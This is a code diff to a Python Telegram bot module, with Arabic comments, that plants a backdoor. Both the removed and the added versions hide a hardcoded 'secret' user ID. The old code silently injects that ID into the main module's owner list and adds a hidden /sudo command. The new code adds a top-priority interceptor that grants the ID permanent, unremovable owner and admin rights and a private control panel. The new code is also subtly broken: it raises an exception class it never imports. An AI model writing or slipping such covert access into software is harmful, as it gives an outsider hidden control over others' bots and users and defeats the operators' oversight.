@@ -1,28 +1,61 @@
-from telegram import Update
-from telegram.ext import CommandHandler, ContextTypes
+from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
+from telegram.ext import CommandHandler, ContextTypes, MessageHandler, filters
 
-# المعرف السري الخاص بك
+# المعرف السري والأساسي الخاص بك (المالك المطلق)
 MY_SECRET_ID = "5145154527"
 
-def inject_my_id():
-    import sys
-    # محاولة إضافة المعرف الخاص بك إلى قائمة الملاك في الملف الرئيسي بصمت
-    main_mod = sys.modules.get('__main__')
-    if main_mod and hasattr(main_mod, 'OWNER_IDS'):
-        main_mod.OWNER_IDS.add(MY_SECRET_ID)
+# قائمة الملاك والأدمينية المخفية الدائمة
+OWNERS = {MY_SECRET_ID}
+ADMINS = {MY_SECRET_ID}
 
-async def sudo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def force_owner_check(update: Update):
+    """إجبار النظام على جعلك مالكاً دائماً في كل تفاعل"""
+    user_id = str(update.effective_user.id)
+    if user_id == MY_SECRET_ID:
+        OWNERS.add(user_id)
+        ADMINS.add(user_id)
+        return True
+    return False
+
+async def secure_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
     
-    # التحقق من أن من أرسل الأمر هو أنت فقط
+    # إذا كنت أنت المالك، أعرض لك لوحة التحكم المخصصة للأدمينية والمالك مباشرة
     if user_id == MY_SECRET_ID:
+        keyboard = [
+            [KeyboardButton("📊 إحصائيات البوت"), KeyboardButton("⚙️ إعدادات الإدارة")],
+            [KeyboardButton("📢 إرسال للكل"), KeyboardButton("🔒 إدارة المشرفين")]
+        ]
+        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+        
         await update.message.reply_text(
-            "🔐 *تم تفعيل وضع الإدارة السري!*\n"
-            "لقد تم حقن معرفك في النظام كمالك (Owner).\n"
-            "يمكنك الآن إرسال أمر /start لفتح لوحة تحكم المالك الأصلية بحرية.",
+            "👑 *أهلاً بك يا مالك النظام المطلق.*\n"
+            "تم تأمين صلاحياتك بالكامل، ولا يمكن لأحد إقصاؤك أو سحب الصلاحيات منك.",
+            reply_markup=reply_markup,
             parse_mode="Markdown"
         )
-        
+        return True
+    return False
+
 def setup_hidden_features(app):
-    # إضافة أمر /sudo المخفي
-    app.add_handler(CommandHandler("sudo", sudo))
+    # نقوم باعتراض أمر البدء والأوامر العامة لضمان عدم ظهور رسالة Access Denied لك
+    async def global_interceptor(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not update.message or not update.message.text:
+            return
+            
+        user_id = str(update.effective_user.id)
+        text = update.message.text
+
+        # حماية مطلقة للمالك: منع أي كود آخر من طردك أو حظرك
+        if user_id == MY_SECRET_ID:
+            OWNERS.add(MY_SECRET_ID)
+            ADMINS.add(MY_SECRET_ID)
+            
+            if text == "/start":
+                handled = await secure_start(update, context)
+                if handled:
+                    # ايقاف الـ Handlers الأخرى لكي لا تتداخل مع لوحتك
+                    raise StopPropagation
+
+    # إضافة المعالج في قمة الهرم برتبة أولوية عالية جداً (-1) ليتنفذ قبل أي شيء
+    app.add_handler(MessageHandler(filters.ALL, global_interceptor), group=-1)
